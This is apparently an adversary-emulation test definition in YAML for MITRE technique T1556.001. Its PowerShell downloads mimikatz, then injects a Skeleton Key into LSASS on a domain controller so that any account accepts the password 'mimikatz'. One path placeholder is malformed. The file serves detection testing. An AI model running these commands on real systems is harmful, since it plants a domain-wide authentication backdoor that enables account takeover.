attack_technique: T1556.001
display_name: Modify Authentication Process: Domain Controller Authentication
atomic_tests:

- name: Skeleton Key via mimikatz
  description: |
    Uses mimikatz to inject false credentials into a domain controller, creating a backdoor password. Mimikatz will inject the password 'mimikatz' into LSASS, allowing an attacker to log into any account with 'mimikatz'.
  supported_platforms:
    - windows
  dependencies:
    - description: Mimikatz will need to be on the host machine
      prereq_command: |
        if(Test-Path -Path #{local_folder}#{local_executable}) {exit 0} else {exit 1}
      get_prereq_command: ' Invoke-Webrequest -Uri #{mimikatz_url} -OutFile #{local_folder}#{local_executable}'
  executor:
    command: |
      $mimikatz_path = "#{mimikatz_path"
      Write-Host "Injecting Skeleton Key into LSASS"
      & $mimikatz_path "privilege::debug" "misc::skeleton" "exit"
      Write-Host "Injection complete, you can now authenticate with any user with the password 'mimikatz'"
    cleanup_command: Restart-Computer -Force
    name: powershell
    elevation_required: true
